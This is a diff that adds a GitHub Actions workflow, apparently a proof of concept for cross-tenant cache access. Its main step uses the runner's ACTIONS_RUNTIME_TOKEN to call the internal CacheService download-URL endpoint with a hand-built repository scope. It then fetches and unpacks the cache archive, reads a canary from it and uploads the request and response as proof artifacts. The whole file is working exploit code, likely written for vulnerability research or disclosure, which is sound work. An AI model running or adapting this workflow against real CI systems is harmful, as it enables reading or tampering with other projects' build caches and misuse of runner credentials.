@@ -1,0 +1,52 @@
+name: G06 Cache Consumer
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  consumer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Seed runner cache plumbing
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p consumer_seed
+          echo seed > consumer_seed/seed.txt
+      - name: Read cross-tenant cache canary
+        shell: bash
+        env:
+          CACHE_KEY: rhino-repoid-bind-28850399061
+          CACHE_VERSION: 60eedb36b3f561716fceff9be2138809c905dc78b32f9c30dbf3869364d3de83
+        run: |
+          set -euo pipefail
+          base="${ACTIONS_RESULTS_URL%/}"
+          repo_id="${GITHUB_REPOSITORY_ID}"
+          body=$(jq -n --arg rid "$repo_id" --arg key "$CACHE_KEY" --arg version "$CACHE_VERSION" "{metadata:{repository_id:(\$rid|tonumber),scope:[{scope:\"refs/heads/main\",permission:3}]},key:\$key,version:\$version}")
+          status=$(curl -sS -o cache-response.json -w "%{http_code}" -H "Authorization: Bearer ${ACTIONS_RUNTIME_TOKEN}" -H "Content-Type: application/json" -H "Accept: application/json" --data "$body" "$base/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL")
+          {
+            echo "POST $base/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL"
+            echo "Content-Type: application/json"
+            echo "Authorization: Bearer <B_RUNTIME_TOKEN>"
+            echo
+            echo "$body"
+            echo "HTTP $status"
+            cat cache-response.json
+          } > cache-request-response.txt
+          test "$status" = 200
+          url=$(jq -r ".signed_download_url // empty" cache-response.json)
+          test -n "$url"
+          curl -sS "$url" -o cache.tgz
+          tar -xzf cache.tgz
+          canary=$(cat ab_cache/cache.txt)
+          printf "B_REPOSITORY=%s\nB_REPOSITORY_ID=%s\nCACHE_LOOKUP_HTTP=%s\nCACHE_CANARY=%s\n" "$GITHUB_REPOSITORY" "$repo_id" "$status" "$canary" >> "$GITHUB_STEP_SUMMARY"
+          echo "$canary" > cache-consumer-proof.txt
+          echo "B cache consumer read: $canary"
+      - name: Upload cache consumer proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: g06-cache-consumer-proof
+          path: |
+            cache-request-response.txt
+            cache-response.json
+            cache-consumer-proof.txt
